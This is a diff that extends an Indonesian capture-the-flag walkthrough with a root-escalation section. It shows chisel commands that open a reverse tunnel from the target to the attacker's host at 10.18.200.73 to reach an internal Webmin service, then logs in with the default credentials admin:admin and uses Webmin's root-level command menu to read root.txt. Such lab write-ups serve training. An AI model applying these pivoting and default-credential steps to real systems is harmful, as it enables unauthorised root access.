@@ -136,3 +136,32 @@
     - Mengambil flag user.txt
 
         ![Alt text](images/user.png)
+
+
+
+
+
+Tidak ada SUID dan juga password yang berada di local tapi masih ada port yang berbeda saat melakukan nmap pertama kali
+
+![alt text](images/port.png)
+
+
+Port 10000 pada target hanya dapat di akses pada target dan harus melakukan port forwarding untuk dapat dibuka pada local menggunakan chisel.
+
+Chisel Server
+
+```
+chisel server --socks5 --reverse
+```
+
+Chisel Client
+
+```
+./chisel client --fingerprint ZF18d0ZyVYNQmlTy9cdCysD14mWBFhgylhWNU42C2yM= 10.18.200.73:8080 R:8000:127.0.0.1:10000
+```
+
+
+setelah terhubung dapat membuka server dengan url `https://127.0.0.1:8000` dan di arahkan kepada layanan webmin dengan default credentials `admin:admin`
+dengan menu `command` webmin sendiri sudah memiliki hak akses root yang dapat mengakses flag root.txt
+
+![alt text](images/root.png)
